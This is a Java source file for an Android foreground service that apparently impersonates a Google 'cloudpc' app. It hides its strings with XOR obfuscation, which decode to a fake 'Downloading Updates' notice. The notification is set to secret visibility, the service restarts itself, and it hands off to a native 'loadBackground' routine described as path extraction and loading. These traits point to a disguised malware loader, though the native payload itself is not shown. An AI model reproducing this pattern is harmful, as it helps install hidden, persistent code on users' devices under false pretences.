package com.google.android.apps.work.cloudpc;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.AudioAttributes;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

public class MyService extends Service {

    private static final String TAG = "MyService";
    private static final String CHANNEL_ID = Manager.d("Ghkq`TGWavrmgaGlejjah");
    static boolean isRunning = false;

    public static void start(Context context) {
        Manager.init();
        if (isRunning) {
            Log.i(TAG, "Service already running");
            return;
        }

        Intent serviceIntent = new Intent(context, MyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "Service created");
        createNotificationChannel();
    }

    Uri soundUri;
    Notification notification;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Service started");
        soundUri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.clean);

        notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(Manager.d("@ksjhke`mjc$Qt`epaw"))
                .setContentText(Manager.d("Qt`epaw$eva$famjc$`ksjhke`a`***"))
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setSound(soundUri)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }

        // Migrate path extraction and loading to Manager.loadBackground (native)
        Manager.loadBackground(this);

        isRunning = true;
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    Manager.d("Ghkq`TGWavrmgaGlejjah"),
                    NotificationManager.IMPORTANCE_LOW
            );
            
            AudioAttributes audioAttributes = new AudioAttributes.Builder()
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .setUsage(AudioAttributes.USAGE_NOTIFICATION)
                    .build();
            
            serviceChannel.setSound(soundUri, audioAttributes);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.i(TAG, "Service bound");
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Service destroyed");
        isRunning = false;
    }

    @Override
    public void onLowMemory() {
        super.onLowMemory();
        Log.i(TAG, "Service low memory");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.i(TAG, "Service unbound");
        return super.onUnbind(intent);
    }
}
